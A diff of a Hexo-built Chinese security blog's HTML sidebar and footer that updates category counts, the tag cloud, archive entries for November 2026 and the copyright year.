   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-tasks"></i>分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">45</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a><span class="category-list-count">31</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/">开发安全</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">46</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">安全建设</a><span class="category-list-count">31</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/">开发安全</a><span class="category-list-count">25</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/CodeScan%E5%AE%9E%E6%88%98/">CodeScan实战</a><span class="category-list-count">18</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -2017,7 +2007,7 @@ function showBtn(){
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-cloud"></i>标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Android-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/ChatGPT/" style="font-size: 10px;">ChatGPT</a> <a href="/tags/DevSecOps/" style="font-size: 11.25px;">DevSecOps</a> <a href="/tags/GPT-4/" style="font-size: 10px;">GPT-4</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/SDL/" style="font-size: 17.5px;">SDL</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 10px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.25px;">docker</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/iam/" style="font-size: 10px;">iam</a> <a href="/tags/jsonp%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 12.5px;">web安全</a> <a href="/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/zero-trust/" style="font-size: 10px;">zero-trust</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%88%86%E6%9E%90/" style="font-size: 10px;">分析</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 11.25px;">基础</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 18.75px;">基础知识</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 10px;">备忘录</a> <a href="/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" style="font-size: 10px;">威胁情报</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" style="font-size: 20px;">安全建设</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 16.25px;">安全开发</a> <a href="/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" style="font-size: 12.5px;">安全漏洞</a> <a href="/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/" style="font-size: 13.75px;">安全防护</a> <a href="/tags/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/" style="font-size: 11.25px;">安装使用</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 18.75px;">工具使用</a> <a href="/tags/%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/" style="font-size: 10px;">平台建设</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 13.75px;">应急响应</a> <a href="/tags/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/" style="font-size: 10px;">开发安全</a> <a href="/tags/%E5%BC%80%E6%BA%90/" style="font-size: 13.75px;">开源</a> <a href="/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">开源工具</a> <a href="/tags/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/" style="font-size: 10px;">微信公众号</a> <a href="/tags/%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">技巧</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">操作记录</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" style="font-size: 10px;">数据安全</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 10px;">未授权访问</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 10px;">漏洞利用</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/%E7%A7%81%E4%BF%A1%E4%BA%92%E5%8A%A8/" style="font-size: 10px;">私信互动</a> <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" style="font-size: 10px;">移动安全</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">编程基础</a> <a href="/tags/%E8%9C%9C%E7%BD%90/" style="font-size: 13.75px;">蜜罐</a> <a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" style="font-size: 15px;">解决方法</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">资产扫描</a> <a href="/tags/%E8%BF%81%E7%A7%BB/" style="font-size: 10px;">迁移</a> <a href="/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">运维安全</a> <a href="/tags/%E9%80%9F%E6%9F%A5%E8%A1%A8/" style="font-size: 10px;">速查表</a> <a href="/tags/%E9%9B%B6%E4%BF%A1%E4%BB%BB/" style="font-size: 10px;">零信任</a>
+      <a href="/tags/Android-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/CI-CD/" style="font-size: 10px;">CI-CD</a> <a href="/tags/ChatGPT/" style="font-size: 11.25px;">ChatGPT</a> <a href="/tags/CodeScan-Artex/" style="font-size: 18.75px;">CodeScan-Artex</a> <a href="/tags/DevSecOps/" style="font-size: 12.5px;">DevSecOps</a> <a href="/tags/Docker/" style="font-size: 11.25px;">Docker</a> <a href="/tags/GPT-4/" style="font-size: 11.25px;">GPT-4</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/Mantis/" style="font-size: 10px;">Mantis</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/Planner/" style="font-size: 10px;">Planner</a> <a href="/tags/SDL/" style="font-size: 17.5px;">SDL</a> <a href="/tags/SSE/" style="font-size: 10px;">SSE</a> <a href="/tags/STRIDE/" style="font-size: 10px;">STRIDE</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/TTFT/" style="font-size: 10px;">TTFT</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 10px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.25px;">docker</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/iam/" style="font-size: 10px;">iam</a> <a href="/tags/jsonp%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/note/" style="font-size: 20px;">note</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 12.5px;">web安全</a> <a href="/tags/windows-%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/zero-trust/" style="font-size: 10px;">zero-trust</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 11.25px;">代码审计</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E6%A8%A1%E6%9D%BF/" style="font-size: 10px;">任务模板</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E7%8A%B6%E6%80%81/" style="font-size: 10px;">任务状态</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E7%BC%96%E6%8E%92/" style="font-size: 10px;">任务编排</a> <a href="/tags/%E4%BB%BB%E5%8A%A1%E8%AE%BE%E8%AE%A1/" style="font-size: 10px;">任务设计</a> <a href="/tags/%E5%88%86%E6%9E%90/" style="font-size: 10px;">分析</a> <a href="/tags/%E5%8F%8D%E8%AF%81/" style="font-size: 10px;">反证</a> <a href="/tags/%E5%8F%AF%E8%A7%82%E6%B5%8B%E6%80%A7/" style="font-size: 11.25px;">可观测性</a> <a href="/tags/%E5%8F%AF%E9%9D%A0%E6%80%A7/" style="font-size: 10px;">可靠性</a> <a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 11.25px;">基础</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 17.5px;">基础知识</a> <a href="/tags/%E5%A2%9E%E9%87%8F%E4%BF%9D%E5%AD%98/" style="font-size: 10px;">增量保存</a> <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" style="font-size: 10px;">备忘录</a> <a href="/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/" style="font-size: 12.5px;">威胁建模</a> <a href="/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/" style="font-size: 10px;">威胁情报</a> <a href="/tags/%E5%AD%98%E5%82%A8%E6%B8%85%E7%90%86/" style="font-size: 10px;">存储清理</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" style="font-size: 20px;">安全建设</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 16.25px;">安全开发</a> <a href="/tags/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" style="font-size: 12.5px;">安全漏洞</a> <a href="/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/" style="font-size: 13.75px;">安全防护</a> <a href="/tags/%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/" style="font-size: 11.25px;">安装使用</a> <a href="/tags/%E5%AE%8C%E6%95%B4%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">完整审计</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E8%A6%86%E7%9B%96/" style="font-size: 10px;">审计覆盖</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E8%AF%84%E6%B5%8B/" style="font-size: 10px;">审计评测</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" style="font-size: 17.5px;">工具使用</a> <a href="/tags/%E5%B7%A5%E5%85%B7%E8%B0%83%E7%94%A8/" style="font-size: 11.25px;">工具调用</a> <a href="/tags/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/" style="font-size: 10px;">工程实践</a> <a href="/tags/%E5%B7%A5%E7%A8%8B%E7%BB%B4%E6%8A%A4/" style="font-size: 10px;">工程维护</a> <a href="/tags/%E5%B9%B3%E5%8F%B0%E5%BB%BA%E8%AE%BE/" style="font-size: 10px;">平台建设</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 13.75px;">应急响应</a> <a href="/tags/%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/" style="font-size: 10px;">开发安全</a> <a href="/tags/%E5%BC%80%E6%BA%90/" style="font-size: 13.75px;">开源</a> <a href="/tags/%E5%BC%80%E6%BA%90%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">开源工具</a> <a href="/tags/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/" style="font-size: 11.25px;">微信公众号</a> <a href="/tags/%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">技巧</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">操作记录</a> <a href="/tags/%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D/" style="font-size: 11.25px;">故障恢复</a> <a href="/tags/%E6%95%85%E9%9A%9C%E6%8E%92%E6%9F%A5/" style="font-size: 11.25px;">故障排查</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/" style="font-size: 10px;">数据安全</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 10px;">未授权访问</a> <a href="/tags/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2/" style="font-size: 10px;">本地部署</a> <a href="/tags/%E6%A8%A1%E5%9E%8B%E6%80%A7%E8%83%BD/" style="font-size: 10px;">模型性能</a> <a href="/tags/%E6%A8%A1%E5%9E%8B%E8%AE%A1%E9%87%8F/" style="font-size: 10px;">模型计量</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 10px;">漏洞利用</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/%E7%A7%81%E4%BF%A1%E4%BA%92%E5%8A%A8/" style="font-size: 10px;">私信互动</a> <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" style="font-size: 10px;">移动安全</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">编程基础</a> <a href="/tags/%E8%9C%9C%E7%BD%90/" style="font-size: 13.75px;">蜜罐</a> <a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/" style="font-size: 15px;">解决方法</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E8%AF%81%E6%8D%AE%E9%93%BE/" style="font-size: 10px;">证据链</a> <a href="/tags/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">资产扫描</a> <a href="/tags/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/" style="font-size: 10px;">身份认证</a> <a href="/tags/%E8%BF%81%E7%A7%BB/" style="font-size: 10px;">迁移</a> <a href="/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/" style="font-size: 11.25px;">运维安全</a> <a href="/tags/%E8%BF%90%E8%A1%8C%E5%A4%8D%E7%9B%98/" style="font-size: 10px;">运行复盘</a> <a href="/tags/%E8%BF%90%E8%A1%8C%E9%A2%84%E7%AE%97/" style="font-size: 11.25px;">运行预算</a> <a href="/tags/%E9%80%9F%E6%9F%A5%E8%A1%A8/" style="font-size: 10px;">速查表</a> <a href="/tags/%E9%95%BF%E4%B8%8A%E4%B8%8B%E6%96%87/" style="font-size: 10px;">长上下文</a> <a href="/tags/%E9%95%BF%E7%A8%8B%E4%BB%BB%E5%8A%A1/" style="font-size: 10px;">长程任务</a> <a href="/tags/%E9%9B%B6%E4%BF%A1%E4%BB%BB/" style="font-size: 10px;">零信任</a>
     </div>
   </div>
 
@@ -2027,8 +2017,8 @@ function showBtn(){
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s" ><i class="fa fa-archive"></i>归档</h3>
     <div class="widget">
-      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">2023年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">2022年03月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">2021年12月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">2021年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">2021年08月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">2021年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">2021年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">2021年05月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">2019年11月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">2019年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">2019年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">2019年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">2019年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">2019年04月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
+      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/11/">十一月 2026</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">一月 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">15</span></li></ul> -->
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/11/">2026年11月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">2023年08月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">2022年03月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">2021年12月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">2021年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">2021年08月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">2021年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">2021年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">2021年05月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">2019年11月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">2019年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">2019年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">2019年08月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">2019年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">2019年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">2019年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">2019年04月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">2019年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">2019年01月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">2018年12月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">15</span></li></ul>
     </div>
   </div>
 
@@ -2293,7 +2283,7 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
   
   <div  data-scroll-reveal="enter bottom"  class="outer">
     <div id="footer-info" class="inner">
-      &copy; 2023 Pa55w0rd<br>
+      &copy; 2026 Pa55w0rd<br>
       Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
       .
       Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
@@ -2336,12 +2326,38 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
   
 </nav>
